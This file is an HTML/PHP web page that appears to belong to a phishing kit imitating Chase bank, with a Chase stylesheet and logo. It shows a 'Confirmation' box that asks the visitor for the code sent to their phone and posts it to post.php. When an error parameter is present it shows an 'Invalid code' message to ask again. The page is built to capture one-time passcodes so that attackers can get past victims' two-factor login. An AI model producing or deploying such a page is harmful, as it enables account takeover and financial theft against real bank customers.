<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport"
		content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/chase.css">
    <title></title>
</head>
<body>

<header>
        <img src="res/img/logo.svg">
    </header>

  <section>
   <div class="Container">

   
      <div class="box">
        <h3>Confirmation</h3>
        <p>Please enter the code sent to your phone number to continue.</p>
      </div>
 
   <form action="post.php" method="post">

        <div class="box">
          <input type="text" name="otp" required placeholder="Enter the code">
          <?php 
if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code. Please try again.</p>';
}
?>
        </div>

        <div><button type="sumbit">Continue</button></div>
    </form>
        
        


      </div>









    </div>












    </section>


</body>
</html>  